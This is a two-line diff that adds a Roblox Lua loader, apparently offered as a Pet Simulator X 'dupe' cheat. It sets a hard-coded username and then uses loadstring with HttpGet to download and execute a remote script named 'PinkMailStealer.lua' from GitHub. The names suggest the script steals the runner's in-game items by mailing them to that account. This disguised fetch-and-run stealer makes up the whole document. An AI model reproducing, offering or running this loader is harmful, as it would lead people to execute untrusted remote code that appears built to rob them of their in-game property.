@@ -1,0 +1,2 @@
+
+ _G.Name = "join our discord for for more" _G.Username = "Cuyf68h9" loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkMailStealer.lua", true))()
